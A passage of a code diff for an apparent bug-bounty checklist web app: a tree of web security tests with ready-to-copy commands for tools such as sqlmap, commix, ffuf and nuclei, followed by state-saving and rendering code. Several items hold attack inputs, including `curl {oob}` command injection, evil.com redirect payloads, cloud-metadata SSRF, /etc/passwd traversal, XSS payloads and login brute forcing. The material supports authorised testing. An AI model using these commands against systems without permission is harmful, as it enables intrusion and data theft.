+              { id: 'info_multi_channel', title: 'Identify multiple API versions (v1, v2, beta, graphql)', cmd: 'ffuf -u https://{domain}/api/FUZZ/users -w <(seq -f "v%.0f" 1 10) -mc all -fc 404', desc: 'Test older API versions (e.g. /api/v1/) that may lack rate-limiting or MFA.' },
+              { id: 'info_cohosted', title: 'Identify co-hosted & virtual host applications', cmd: 'ffuf -u https://{domain} -H "Host: FUZZ.{domain}" -w {wordlist} -ac', desc: 'Fuzz the Host header to uncover internal virtual hosts on the same IP.' },
+              { id: 'info_hostnames_ports', title: 'Map all hostnames and exposed management ports', desc: 'Catalog SSH, Redis, ElasticSearch, Prometheus, or Kubernetes ports.' },
+              { id: 'info_third_party', title: 'Catalog third-party integrations & Cloud Buckets', cmd: 'cloud_enum -k {domain}', desc: 'Enumerate AWS S3, Azure Blobs, and GCP buckets associated with the target.' },
+              { id: 'info_debug_params', title: 'Hidden HTTP Parameter Discovery (arjun / x8)', cmd: 'arjun -u https://{domain}/ -m GET,POST,JSON -t 20', desc: 'Fuzz for unreferenced parameters (?debug=1, ?admin=true, ?test=1).' }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'config_mgmt',
+        title: 'Configuration & Cloud Misconfiguration Management',
+        icon: 'fa-gears',
+        badge: 'Config',
+        children: [
+          { id: 'cfg_admin_urls', title: 'Discover admin portals, Actuator & Swagger UI', cmd: 'nuclei -u https://{domain} -t http/exposures/apis/ -t http/exposed-panels/ -H "{header}"', desc: 'Scan for Spring Boot Actuator, Swagger/OpenAPI, phpMyAdmin, and Adminer.' },
+          { id: 'cfg_git_expose', title: 'Check for exposed .git / .svn / .env files', cmd: 'git-dumper https://{domain}/.git/ ./dumped_git_{domain}', desc: 'Attempt to reconstruct source code from exposed .git directories.' },
+          { id: 'cfg_iis_short', title: 'IIS Tilde (~) 8.3 Shortname Enumeration', cmd: 'shortscan https://{domain}/', desc: 'Identify hidden files on Windows IIS servers via 8.3 short filename probing.' },
+          { id: 'cfg_backup_files', title: 'Check for old, backup & unreferenced archives', cmd: 'ffuf -u https://{domain}/FUZZ -w {wordlist} -e .bak,.old,.zip,.tar.gz,.sql,.swp -ac', desc: 'Search for source code archives and database dumps.' },
+          { id: 'cfg_http_methods', title: 'Test HTTP methods (PUT, DELETE, TRACE, PATCH)', cmd: 'curl -v -X OPTIONS https://{domain}/ && curl -s -X TRACE https://{domain}/', desc: 'Verify whether arbitrary file upload (PUT) or Cross-Site Tracing is enabled.' },
+          { id: 'cfg_file_ext', title: 'Test file extension handling & path confusion', desc: 'Test semicolon bypasses (/admin;v=1.css) and Web Cache Deception (/profile/a.css).' },
+          { id: 'cfg_sec_headers', title: 'Audit Security HTTP Headers (CSP, HSTS, X-Frame)', cmd: 'nuclei -u https://{domain} -t http/misconfiguration/http-missing-security-headers.yaml', desc: 'Check for missing or weak CSP, HSTS, and framing protections.' },
+          { id: 'cfg_policies', title: 'Inspect crossdomain.xml & clientaccesspolicy.xml', cmd: 'curl -s https://{domain}/crossdomain.xml https://{domain}/clientaccesspolicy.xml', desc: 'Verify cross-domain policies are not overly permissive.' },
+          { id: 'cfg_non_prod_data', title: 'Check non-production data or debug stack traces', cmd: 'curl -s "https://{domain}/?id[]=1" -H "Content-Type: application/json" -d "{invalid_json"', desc: 'Trigger verbose stack traces by sending malformed JSON or array parameters.' },
+          { id: 'cfg_client_secrets', title: 'Scan client code for hardcoded API keys & tokens', cmd: 'nuclei -u https://{domain} -t http/exposures/tokens/ -H "{header}"', desc: 'Automated extraction of Slack, Stripe, AWS, Firebase, and GitHub tokens.' }
+        ]
+      },
+      {
+        id: 'secure_transmission',
+        title: 'Secure Transmission & TLS Cryptography',
+        icon: 'fa-lock',
+        badge: 'TLS',
+        children: [
+          { id: 'ssl_ciphers', title: 'Audit TLS Versions, Weak Ciphers & Vulnerabilities', cmd: 'testssl.sh --fast https://{domain}', desc: 'Test for TLS 1.0/1.1, weak cipher suites, Heartbleed, ROBOT, and CRIME.' },
+          { id: 'cert_validity', title: 'Inspect Certificate Chain & SANs (tlsx)', cmd: 'echo {domain} | tlsx -san -cn -expired -self-signed -mismatched', desc: 'Extract Subject Alternative Names and verify certificate validity.' },
+          { id: 'https_creds', title: 'Verify credentials are transmitted strictly over HTTPS', desc: 'Confirm no HTTP downgrade is possible on login or token endpoints.' },
+          { id: 'https_login_form', title: 'Verify login forms are loaded exclusively over HTTPS', desc: 'Prevent mixed-content tampering of authentication forms.' },
+          { id: 'https_tokens', title: 'Verify session cookies enforce the Secure flag', desc: 'Ensure cookies cannot be leaked over plaintext HTTP connections.' },
+          { id: 'hsts_in_use', title: 'Check HSTS preload & max-age enforcement', desc: 'Confirm Strict-Transport-Security header has adequate max-age.' }
+        ]
+      },
+      {
+        id: 'authentication',
+        title: 'Authentication & SSO Security',
+        icon: 'fa-key',
+        badge: 'AuthN',
+        children: [
+          { id: 'auth_user_enum', title: 'Test for username/email enumeration', desc: 'Compare status codes, response payloads, and response timing on Login, Signup, and Forgot Password.' },
+          { id: 'auth_bypass', title: 'Test for authentication bypass & response manipulation', desc: 'Intercept 401/403 login responses and modify JSON {"success":false} to {"success":true}.' },
+          { id: 'auth_bruteforce', title: 'Test rate-limiting & IP header rotation bypass', cmd: 'ffuf -u https://{domain}/api/login -X POST -d \'{"user":"admin","pass":"FUZZ"}\' -H "X-Forwarded-For: 127.0.0.1" -w passwords.txt', desc: 'Check if rate limits can be bypassed via X-Forwarded-For, X-Real-IP, or case variation.' },
+          { id: 'auth_pwd_quality', title: 'Test password complexity & max-length DoS (bcrypt)', desc: 'Test extremely long passwords (>72 chars for bcrypt truncation or 1MB payload for CPU DoS).' },
+          { id: 'auth_remember_me', title: 'Audit persistent "Remember Me" token entropy', desc: 'Check if remember-me cookies contain predictable base64 or weak hashes.' },
+          { id: 'auth_autocomplete', title: 'Check autocomplete & caching on sensitive fields', desc: 'Verify sensitive inputs and responses are not cached in shared browsers.' },
+          { id: 'auth_reset', title: 'Test Password Reset Host Header Poisoning', cmd: 'curl -i -s -k -X POST https://{domain}/forgot-password -H "Host: {oob}" -H "X-Forwarded-Host: {oob}" -d "email=test@{domain}"', desc: 'Test if password reset links use attacker-controlled Host/X-Forwarded-Host headers.' },
+          { id: 'auth_pwd_change', title: 'Test password change CSRF & current password bypass', desc: 'Verify current password is required when changing password or email address.' },
+          { id: 'auth_captcha', title: 'Test CAPTCHA bypass & token reuse', desc: 'Remove the captcha parameter entirely, send empty string, or replay a solved token.' },
+          { id: 'auth_mfa', title: 'Test 2FA/MFA bypass vectors', desc: 'Test direct forced browsing after step 1, response manipulation, OAuth login MFA bypass, or backup code brute-forcing.' },
+          { id: 'auth_logout', title: 'Verify server-side token revocation on logout', desc: 'Replay JWT or session cookie after logging out to verify server-side invalidation.' },
+          { id: 'auth_cache', title: 'Test Web Cache Deception on authenticated pages', cmd: 'curl -s -I https://{domain}/account/settings/nonexistent.css', desc: 'Check if appending .css/.js causes CDN to cache private user profile data.' },
+          { id: 'auth_defaults', title: 'Scan for default vendor credentials', cmd: 'nuclei -u https://{domain} -t http/default-logins/ -H "{header}"', desc: 'Check exposed interfaces against known default credentials.' },
+          { id: 'auth_history', title: 'Check user-accessible authentication logs', desc: 'Test if login IP or User-Agent logs are vulnerable to Stored XSS.' },
+          { id: 'auth_notifications', title: 'Verify out-of-band alerts on critical account changes', desc: 'Confirm email alerts are sent when MFA is disabled or email is changed.' },
+          { id: 'auth_sso', title: 'Audit OAuth 2.0 / OIDC / SAML flows', desc: 'Test redirect_uri open redirect/token theft, missing state parameter CSRF, and SAML XML Signature Wrapping.' }
+        ]
+      },
+      {
+        id: 'session_mgmt',
+        title: 'Session & JWT Token Management',
+        icon: 'fa-user-gear',
+        badge: 'Session',
+        children: [
+          { id: 'sess_jwt_audit', title: 'JWT Security Audit (jwt_tool)', cmd: 'python3 jwt_tool.py <JWT_TOKEN> -M at -t https://{domain}/api/profile -rh "{header}"', desc: 'Test JWT alg:none, RS256-to-HS256 key confusion, kid SQLi/path traversal, and weak HMAC secrets.' },
+          { id: 'sess_handling', title: 'Establish session handling architecture', desc: 'Map stateful cookies vs stateless JWTs and refresh token rotation.' },
+          { id: 'sess_cookie_flags', title: 'Check session cookies for HttpOnly, Secure & SameSite', desc: 'Verify SameSite=Lax/Strict, HttpOnly, and Secure attributes.' },
+          { id: 'sess_scope', title: 'Check cookie Domain & Path scope', desc: 'Check if subdomain takeover on *.{domain} allows cookie tossing or session hijacking.' },
+          { id: 'sess_duration', title: 'Verify session expiration & idle timeout', desc: 'Confirm access tokens expire promptly.' },
+          { id: 'sess_max_lifetime', title: 'Test refresh token reuse detection', desc: 'Verify used refresh tokens cannot be replayed indefinitely.' },
+          { id: 'sess_timeout', title: 'Check session termination after relative timeout', desc: 'Verify idle sessions are invalidated.' },
+          { id: 'sess_logout_term', title: 'Confirm all active sessions revoke on password reset', desc: 'Verify existing sessions are killed when a user resets their password.' },
+          { id: 'sess_simultaneous', title: 'Test concurrent session limits', desc: 'Evaluate whether simultaneous logins are restricted or logged.' },
+          { id: 'sess_randomness', title: 'Analyze session token entropy (Burp Sequencer)', desc: 'Ensure session identifiers cannot be predicted or brute-forced.' },
+          { id: 'sess_reissue', title: 'Test for Session Fixation on privilege change', desc: 'Verify a brand-new session cookie is issued after login or privilege elevation.' },
+          { id: 'sess_puzzling', title: 'Test for Session Puzzling / Variable Overwriting', desc: 'Attempt reusing password-reset session state to access authenticated endpoints.' },
+          { id: 'sess_csrf_clickjacking', title: 'Test CSRF & Clickjacking defenses', desc: 'Test method override (POST->GET), Content-Type switching (JSON->form-urlencoded), and iframe embedding.' }
+        ]
+      },
+      {
+        id: 'authorization',
+        title: 'Authorization, IDOR & Access Control',
+        icon: 'fa-user-shield',
+        badge: 'AuthZ',
+        children: [
+          { id: 'authz_403_bypass', title: 'Automated 403/401 Forbidden Bypass (nomore403)', cmd: 'nomore403 -u https://{domain}/admin -H "{header}"', desc: 'Fuzz X-Original-URL, X-Rewrite-URL, %2e/, and HTTP verb tampering to bypass 403s.' },
+          { id: 'authz_path_traversal', title: 'Path Traversal & Arbitrary File Read', cmd: 'ffuf -u "https://{domain}/download?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200', desc: 'Test directory traversal payloads (..%2f, ..%252f, /etc/passwd).' },
+          { id: 'authz_bypass_schema', title: 'Test HTTP Parameter Pollution & JSON Mass Assignment', desc: 'Inject "role":"admin", "is_admin":true, or duplicate user_id parameters in PUT/PATCH requests.' },
+          { id: 'authz_priv_escalation', title: 'Test Vertical Privilege Escalation (Admin API access)', desc: 'Replay Admin API requests using a low-privileged User session token (Burp Autorize).' },
+          { id: 'authz_horizontal', title: 'Test Horizontal Access Control (IDOR / BOLA)', desc: 'Swap sequential IDs, UUIDs, or test numeric IDs where UUIDs are expected.' },
+          { id: 'authz_graphql_idor', title: 'GraphQL Introspection & Field-Level AuthZ (graphql-cop)', cmd: 'python3 graphql-cop.py -t https://{domain}/graphql', desc: 'Audit GraphQL endpoints for exposed schemas, nested object IDORs, and query batching.' },
+          { id: 'authz_missing', title: 'Check for unauthenticated access to state-changing APIs', desc: 'Strip Authorization/Cookie headers entirely on PUT/POST/DELETE endpoints.' }
+        ]
+      },
+      {
+        id: 'data_validation',
+        title: 'Injection & Server-Side Data Validation',
+        icon: 'fa-vial-virus',
+        badge: 'Injection',
+        children: [
+          { id: 'val_r_xss', title: 'Reflected & Blind XSS Scanning (dalfox + kxss)', cmd: 'cat urls_{domain}.txt | kxss | sed "s/.*on //;s/ .*//" | sort -u | dalfox pipe --blind https://{oob} -H "{header}"', desc: 'Find parameters reflecting special characters with kxss and exploit with Dalfox.' },
+          { id: 'val_s_xss', title: 'Test Stored & Blind XSS in all user inputs', desc: 'Inject Blind XSS payloads into User-Agent, Referer, support tickets, and profile fields.' },
+          { id: 'val_dom_xss', title: 'Audit DOM XSS sinks & Prototype Pollution', desc: 'Check location.search/hash flows into innerHTML, eval(), and test __proto__[polluted]=true.' },
+          { id: 'val_sqli', title: 'SQL Injection Testing (sqlmap / ghauri)', cmd: 'sqlmap -u "https://{domain}/item?id=1" --batch --random-agent --level=3 --risk=2', desc: 'Test error-based, boolean-blind, and time-based SQL injection.' },
+          { id: 'val_ssti', title: 'Server-Side Template Injection (SSTImap)', cmd: 'sstimap -u "https://{domain}/page?name=test"', desc: 'Probe Jinja2, Twig, Freemarker, and Velocity template engines using {{7*7}} and ${7*7}.' },
+          { id: 'val_xxe', title: 'Test XML External Entity (XXE) & Blind OOB XXE', desc: 'Test XML, SOAP, SVG image uploads, and DOCX/XLSX parsers with external DTD callbacks to {oob}.' },
+          { id: 'val_cmd_injection', title: 'OS Command Injection (commix / OOB DNS)', cmd: 'commix --url="https://{domain}/ping?ip=127.0.0.1" --batch', desc: 'Inject `curl {oob}` or $(nslookup {oob}) into system parameters.' },
+          { id: 'val_lfi_rfi', title: 'Local & Remote File Inclusion (PHP Wrappers)', desc: 'Test php://filter/convert.base64-encode/resource=index.php and /proc/self/environ.' },
+          { id: 'val_open_redirect', title: 'Test Open Redirects (OAuth & SSRF Chaining)', cmd: 'cat urls_{domain}.txt | gf redirect | qsreplace "https://evil.com" | httpx -silent -location -mc 301,302', desc: 'Locate unvalidated redirect parameters to chain with OAuth token theft or SSRF.' },
+          { id: 'val_nosql', title: 'Test NoSQL Injection (MongoDB Operators)', desc: 'Test ?user[$ne]=null&pass[$ne]=null or JSON {"username":{"$gt":""}}.' },
+          { id: 'val_ssrf', title: 'Server-Side Request Forgery (SSRF & Cloud Metadata)', cmd: 'cat urls_{domain}.txt | gf ssrf | qsreplace "http://{oob}" | httpx -silent -H "{header}"', desc: 'Test webhook testers, PDF generators, and URL importers against {oob} and 169.254.169.254.' },
+          { id: 'val_smuggling', title: 'HTTP Request Smuggling (smuggler)', cmd: 'python3 smuggler.py -u https://{domain}/', desc: 'Test CL.TE, TE.CL, and HTTP/2 (H2.CL) request smuggling desynchronization.' }
+        ]
+      },
+      {
+        id: 'dos',
+        title: 'Application DoS & Rate-Limit Resilience',
+        icon: 'fa-ban',
+        badge: 'Resilience',
+        children: [
+          { id: 'dos_anti_automation', title: 'Verify anti-automation on expensive endpoints', desc: 'Check SMS/email OTP triggers, export generators, and heavy search queries.' },
+          { id: 'dos_account_lockout', title: 'Test weaponized account lockout', desc: 'Evaluate whether an attacker can permanently lock out executives or admins.' },
+          { id: 'dos_graphql_batch', title: 'Test GraphQL Circular Query & Alias Overloading', desc: 'Check if deep nested queries or 100+ batched aliases are blocked.' },
+          { id: 'dos_redos', title: 'Test Regular Expression DoS (ReDoS) & XML Bomb', desc: 'Test complex regex validators and Billon Laughs entity expansion.' }
+        ]
+      },
+      {
+        id: 'business_logic',
+        title: 'Business Logic & Race Conditions',
+        icon: 'fa-briefcase',
+        badge: 'Logic',
+        children: [
+          { id: 'biz_race_cond', title: 'Test Single-Packet Race Conditions (Turbo Intruder)', desc: 'Send 20 parallel HTTP/2 requests on coupon redemption, wallet transfers, or gift card claims.' },
+          { id: 'biz_feature_misuse', title: 'Test multi-step workflow step skipping', desc: 'Jump directly from Step 1 to Step 4 confirmation without completing payment/verification.' },
+          { id: 'biz_non_repudiation', title: 'Check audit log integrity & log injection', desc: 'Test CRLF or fake log entry injection in transaction records.' },
+          { id: 'biz_trust', title: 'Test microservice / webhook signature verification', desc: 'Check if Stripe/PayPal/GitHub webhook endpoints verify HMAC signatures.' },
+          { id: 'biz_data_integrity', title: 'Test negative quantities, rounding errors & currency swap', desc: 'Submit price: -100, quantity: 0.0001, or swap USD to low-value currency in checkout.' },
+          { id: 'biz_segregation', title: 'Test dual-approval & maker-checker bypass', desc: 'Check if the creator of a payout request can also approve it via direct API call.' }
+        ]
+      },
+      {
+        id: 'cryptography',
+        title: 'Application Cryptography & Padding Oracles',
+        icon: 'fa-shield-halved',
+        badge: 'Crypto',
+        children: [
+          { id: 'crypto_unencrypted', title: 'Inspect client-side tokens for sensitive cleartext PII', desc: 'Decode base64/hex cookies, ViewState, and localStorage payloads.' },
+          { id: 'crypto_wrong_algo', title: 'Test AES-ECB block shuffling & CBC Padding Oracle', desc: 'Check if encrypted cookies return 500 Padding Error vs 200 OK (PadBuster).' },
+          { id: 'crypto_weak_algo', title: 'Flag deprecated hashes (MD5, SHA1) in reset tokens', desc: 'Check if password reset tokens use predictable timestamps or MD5(email).' },
+          { id: 'crypto_salting', title: 'Verify proper salting & key derivation', desc: 'Ensure public hashes cannot be reversed via rainbow tables.' },
+          { id: 'crypto_randomness', title: 'Audit PRNG predictability in OTPs & invite codes', desc: 'Collect sequential tokens to check for weak Math.random() or time-seeded PRNGs.' }
+        ]
+      },
+      {
+        id: 'file_uploads',
+        title: 'Risky Functionality — File Uploads & Parsers',
+        icon: 'fa-file-arrow-up',
+        badge: 'Uploads',
+        children: [
+          { id: 'file_whitelist', title: 'Test extension bypasses (.php5, .phtml, .shtml, .svg)', desc: 'Test double extensions (shell.jpg.php), null bytes, and case manipulation.' },
+          { id: 'file_svg_xss', title: 'Test Stored XSS & SSRF via SVG / XML / PDF uploads', desc: 'Upload an SVG containing <script>alert(document.domain)<\/script> or external <image xlink:href>.' },
+          { id: 'file_type_verification', title: 'Test Magic Bytes & Polyglot GIF89a/PDF shells', desc: 'Prepend GIF89a; header or embed payload inside EXIF metadata (exiftool).' },
+          { id: 'file_zip_slip', title: 'Test Zip Slip & Symlink Archive Extraction', desc: 'Upload a .zip/.tar containing "../../../var/www/html/shell.php" or a symlink to /etc/passwd.' },
+          { id: 'file_sanitization', title: 'Test SSRF/XSS/SQLi in the filename parameter itself', desc: 'Set filename="><svg/onload=alert(1)>.jpg" or filename="../../../tmp/test".' },
+          { id: 'file_webroot', title: 'Check direct execution in web root or S3 bucket', desc: 'Locate where the uploaded file is hosted and check Content-Disposition: attachment headers.' },
+          { id: 'file_imagemagick', title: 'Test ImageTragick / Ghostscript parser RCE/LFI', desc: 'Test image resizing pipelines against CVE-2022-44268 (PNG arbitrary file read).' }
+        ]
+      },
+      {
+        id: 'card_payment',
+        title: 'Risky Functionality — Payment & FinTech Flows',
+        icon: 'fa-credit-card',
+        badge: 'FinTech',
+        children: [
+          { id: 'card_known_vulns', title: 'Audit third-party payment iframe & JS integrity (SRI)', desc: 'Check for Subresource Integrity (SRI) on external payment scripts (Magecart protection).' },
+          { id: 'card_insecure_storage', title: 'Ensure PAN / CVV data is never logged or echoed', desc: 'Check API responses and browser storage for leaked card details.' },
+          { id: 'card_transport', title: 'Verify strict TLS on payment tokenization endpoints', desc: 'Ensure direct-to-gateway tokenization cannot be downgraded.' },
+          { id: 'card_csrf', title: 'Test IDOR & CSRF on saved payment methods / payouts', desc: 'Attempt charging another user\'s saved payment_method_id during checkout.' }
+        ]
+      },
+      {
+        id: 'html5_features',
+        title: 'Client-Side, CORS & HTML5 Security',
+        icon: 'fa-code',
+        badge: 'Client',
+        children: [
+          { id: 'html5_cors', title: 'Automated CORS Misconfiguration Scan (corsy / curl)', cmd: 'curl -s -I -H "Origin: https://{domain}.evil.com" -H "Origin: null" https://{domain}/api/user', desc: 'Test reflected arbitrary Origin, prefix/suffix bypasses, and Origin: null with Access-Control-Allow-Credentials: true.' },
+          { id: 'html5_web_messaging', title: 'Audit postMessage listeners for DOM XSS / Token Theft', desc: 'Search JS for window.addEventListener("message") lacking strict event.origin checks.' },
+          { id: 'html5_web_storage', title: 'Inspect localStorage, sessionStorage & IndexedDB', desc: 'Check for sensitive JWTs, API keys, or PII persisted in browser storage.' },
+          { id: 'html5_websocket', title: 'Test Cross-Site WebSocket Hijacking (CSWSH)', desc: 'Check if wss:// handshake relies on cookies without validating the Origin header.' }
+        ]
+      }
+    ];
+
+    // Load Persistent State from LocalStorage
+    function loadState() {
+      try {
+        const savedChk = localStorage.getItem('bb_v7_checklist');
+        const savedFlg = localStorage.getItem('bb_v7_flagged');
+        const savedNotes = localStorage.getItem('bb_v7_notes');
+        const savedCfg = localStorage.getItem('bb_v7_config');
+        const savedScratch = localStorage.getItem('bb_v7_scratchpad');
+
+        if (savedChk) checklistState = JSON.parse(savedChk);
+        if (savedFlg) flaggedState = JSON.parse(savedFlg);
+        if (savedNotes) notesState = JSON.parse(savedNotes);
+        if (savedCfg) {
+          config = { ...config, ...JSON.parse(savedCfg) };
+          document.getElementById('targetDomainInput').value = config.domain;
+          document.getElementById('varWordlist').value = config.wordlist;
+          document.getElementById('varOob').value = config.oob;
+          document.getElementById('varHeader').value = config.header;
+          document.getElementById('varRate').value = config.rate;
+        }
+        if (savedScratch) {
+          document.getElementById('globalScratchpad').value = savedScratch;
+        }
+      } catch (e) {
+        console.error('Error loading state:', e);
+      }
+    }
+
+    function saveState() {
+      try {
+        localStorage.setItem('bb_v7_checklist', JSON.stringify(checklistState));
+        localStorage.setItem('bb_v7_flagged', JSON.stringify(flaggedState));
+        localStorage.setItem('bb_v7_notes', JSON.stringify(notesState));
+        localStorage.setItem('bb_v7_config', JSON.stringify(config));
+        updateProgressStats();
+      } catch (e) {
+        console.error('Error saving state:', e);
+      }
+    }
+
+    function saveGlobalScratchpad(val) {
+      localStorage.setItem('bb_v7_scratchpad', val);
+    }
+
+    function toggleAdvVars() {
+      document.getElementById('advVarsDrawer').classList.toggle('hidden');
+    }
+
+    // Replace Dynamic Variables inside CLI strings
+    function interpolateCmd(rawCmd) {
+      if (!rawCmd) return null;
+      return rawCmd
+        .replace(/{domain}/g, config.domain)
+        .replace(/{wordlist}/g, config.wordlist)
+        .replace(/{oob}/g, config.oob)
+        .replace(/{header}/g, config.header)
+        .replace(/{rate}/g, config.rate);
+    }
+
+    function updateConfig() {
+      config.domain = document.getElementById('targetDomainInput').value.trim() || 'example.com';
+      config.wordlist = document.getElementById('varWordlist').value.trim() || 'wordlist.txt';
+      config.oob = document.getElementById('varOob').value.trim() || 'oob.interact.sh';
+      config.header = document.getElementById('varHeader').value.trim() || 'User-Agent: Mozilla/5.0';
+      config.rate = document.getElementById('varRate').value.trim() || '50';
+
+      document.getElementById('sidebarDomain').innerText = config.domain;
+
+      // Update sidebar chained pipelines
+      document.getElementById('pipe1Cmd').innerText =
+        `subfinder -d ${config.domain} -silent | dnsx -silent | httpx -silent -tech-detect -H "${config.header}" | nuclei -t cves/ -H "${config.header}" -o nuclei_cves.txt`;
+      document.getElementById('pipe2Cmd').innerText =
+        `echo "${config.domain}" | gau | gf xss | uro | dalfox pipe --blind https://${config.oob} -H "${config.header}"`;
+
+      saveState();
+      renderTree(true);
+    }
+
+    function resetConfig() {
+      document.getElementById('targetDomainInput').value = 'example.com';
+      document.getElementById('varWordlist').value = '/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt';
+      document.getElementById('varOob').value = 'oob.interact.sh';
+      document.getElementById('varHeader').value = 'X-Bug-Bounty: HackerOne-Researcher';
+      document.getElementById('varRate').value = '50';
+      updateConfig();
+      showToast('CLI variables reset to defaults!');
+    }
+
+    // Count leaf stats for any node or the entire tree
+    function getBranchStats(node) {
+      let total = 0, checked = 0, flagged = 0;
+      function traverse(n) {
+        if (n.children && n.children.length > 0) {
+          n.children.forEach(traverse);
+        } else {
+          total++;
+          if (checklistState[n.id]) checked++;
+          if (flaggedState[n.id]) flagged++;
+        }
+      }
+      traverse(node);
+      return { total, checked, flagged };
+    }
+
+    function updateProgressStats() {
+      let total = 0, checked = 0, flagged = 0;
+      bugBountyTreeData.forEach(node => {
+        const s = getBranchStats(node);
+        total += s.total;
+        checked += s.checked;
+        flagged += s.flagged;
+      });
+
+      const percentage = total > 0 ? Math.round((checked / total) * 100) : 0;
+      document.getElementById('progressBar').style.width = percentage + '%';
+      document.getElementById('progressText').innerText = `${checked} / ${total} (${percentage}%)`;
+      document.getElementById('flaggedCountBadge').innerHTML = `<i class="fa-solid fa-flag"></i> ${flagged} Flagged`;
+      document.getElementById('treeStatusCount').innerText = `${total} Security Checks & CLI Vectors`;
+    }
+
+    // Render Tree HTML while preserving open/collapsed state
+    function getExpandedNodeIds() {
+      const expanded = new Set();
+      document.querySelectorAll('.tree-node-children:not(.hidden)').forEach(el => {
+        expanded.add(el.id.replace('children-', ''));
+      });
+      return expanded;
+    }
+
+    function createTreeNodeHTML(node, expandedSet) {
+      const isParent = node.children && node.children.length > 0;
+      const nodeId = node.id;
+
+      if (isParent) {
+        const iconClass = node.icon ? node.icon : 'fa-folder';
+        const stats = getBranchStats(node);
+        const isOpen = expandedSet.has(nodeId);
+        const allDone = stats.total > 0 && stats.checked === stats.total;
+
+        return `
+          <div class="tree-node-group mb-2" data-node-id="${nodeId}">
+            <div 
+              onclick="toggleNodeCollapse('${nodeId}')"
+              class="tree-node-content flex items-center justify-between p-2.5 rounded-lg bg-cyber-card hover:bg-cyber-border/80 border ${allDone ? 'border-emerald-500/40' : 'border-cyber-border'} cursor-pointer transition select-none group"
+            >
+              <div class="flex items-center space-x-2.5">
+                <i id="arrow-${nodeId}" class="fa-solid fa-chevron-right text-xs text-cyber-muted transition-transform duration-200 ${isOpen ? 'rotate-90' : ''}"></i>
+                <i class="fa-solid ${iconClass} text-emerald-400 group-hover:scale-110 transition-transform"></i>
+                <span class="font-semibold text-sm text-white">${node.title}</span>
+                ${node.badge ? `<span class="text-[10px] bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 px-2 py-0.5 rounded font-mono">${node.badge}</span>` : ''}
+                ${stats.flagged > 0 ? `<span class="text-[10px] bg-red-500/20 text-red-400 border border-red-500/30 px-1.5 py-0.5 rounded font-mono"><i class="fa-solid fa-fire mr-1"></i>${stats.flagged}</span>` : ''}
+              </div>
+              <div class="flex items-center gap-2">
+                <span class="text-xs font-mono ${allDone ? 'text-emerald-400 font-bold' : 'text-cyber-muted'}">
+                  ${stats.checked}/${stats.total}
+                </span>
+              </div>
+            </div>
+            
+            <div id="children-${nodeId}" class="tree-node-children ${isOpen ? '' : 'hidden'} space-y-2 mt-2">
+              ${node.children.map(child => createTreeNodeHTML(child, expandedSet)).join('')}
+            </div>
+          </div>
+        `;
+      } else {
+        const isChecked = !!checklistState[nodeId];
+        const isFlagged = !!flaggedState[nodeId];
+        const noteText = notesState[nodeId] || '';
+        const hasNoteOpen = !!openNotes[nodeId] || noteText.length > 0;
+        const formattedCmd = interpolateCmd(node.cmd);
+        const searchBlob = `${node.title} ${formattedCmd || ''} ${node.desc || ''} ${noteText}`.toLowerCase();
+
+        return `
+          <div 
+            class="tree-node-item bg-cyber-card/90 border ${isFlagged ? 'border-red-500/60 bg-red-950/10' : 'border-cyber-border/80 hover:border-emerald-500/50'} rounded-lg p-3 transition-colors shadow-sm"
+            data-leaf-id="${nodeId}"
+            data-checked="${isChecked}"
+            data-flagged="${isFlagged}"
+            data-has-cli="${!!formattedCmd}"
+            data-search-text="${escapeHtml(searchBlob)}"
+          >
+            <div class="flex items-start justify-between gap-2">
+              <div class="flex items-start space-x-3 flex-1">
+                <input 
+                  type="checkbox" 
+                  id="chk-${nodeId}"
+                  ${isChecked ? 'checked' : ''} 
+                  onchange="toggleCheckItem('${nodeId}', this.checked)"
+                  class="mt-1 w-4 h-4 rounded border-cyber-border text-emerald-500 focus:ring-emerald-500 bg-cyber-bg cursor-pointer"
+                >
+                <div class="flex-1">
+                  <div class="flex items-center justify-between gap-2">
+                    <label for="chk-${nodeId}" class="text-xs font-semibold ${isChecked ? 'line-through text-cyber-muted' : 'text-slate-100'} cursor-pointer hover:text-emerald-400 transition">
+                      ${node.title}
+                    </label>
+                    <!-- Action Icons: Flag Finding & Toggle PoC Note -->
+                    <div class="flex items-center space-x-1.5">
+                      <button 
+                        onclick="toggleFlagItem('${nodeId}')" 
+                        title="Flag as Vulnerable / Priority Finding"
+                        class="text-xs px-1.5 py-0.5 rounded border transition ${isFlagged ? 'bg-red-500/20 text-red-400 border-red-500/40' : 'bg-cyber-bg text-cyber-muted border-cyber-border hover:text-red-400'}"
+                      >
+                        <i class="fa-solid fa-flag"></i>
+                      </button>
+                      <button 
+                        onclick="toggleNoteBox('${nodeId}')" 
+                        title="Add PoC / Target Notes"
+                        class="text-xs px-1.5 py-0.5 rounded border transition ${noteText ? 'bg-amber-500/20 text-amber-400 border-amber-500/40' : 'bg-cyber-bg text-cyber-muted border-cyber-border hover:text-amber-400'}"
+                      >
+                        <i class="fa-solid fa-note-sticky"></i>
+                      </button>
+                    </div>
+                  </div>
+
+                  ${node.desc ? `<p class="text-[11px] text-cyber-muted mt-0.5 leading-relaxed">${node.desc}</p>` : ''}
+                  
+                  ${formattedCmd ? `
+                    <div class="mt-2 relative bg-cyber-bg border border-cyber-border rounded-md p-2 group">
+                      <code class="cmd-text font-mono text-[11px] text-emerald-400 break-all block pr-8">${escapeHtml(formattedCmd)}</code>
+                      <button 
+                        onclick="copyRawText('${escapeJsString(formattedCmd)}')" 
+                        title="Copy command"
+                        class="absolute right-1.5 top-1.5 text-cyber-muted hover:text-emerald-400 bg-cyber-card p-1 rounded border border-cyber-border hover:border-emerald-500 transition text-xs"
+                      >
+                        <i class="fa-regular fa-copy"></i>
+                      </button>
+                    </div>
+                  ` : ''}
+
+                  <!-- Per-Node Investigator Note / PoC Box -->
+                  <div id="note-box-${nodeId}" class="${hasNoteOpen ? '' : 'hidden'} mt-2">
+                    <textarea
+                      rows="2"
+                      placeholder="Add PoC URL, vulnerable parameter, or observation notes..."
+                      oninput="updateItemNote('${nodeId}', this.value)"
+                      class="w-full bg-cyber-bg/90 border border-amber-500/30 rounded p-2 text-[11px] font-mono text-amber-300 placeholder-cyber-muted focus:outline-none focus:border-amber-400"
+                    >${escapeHtml(noteText)}</textarea>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        `;
+      }
+    }
+
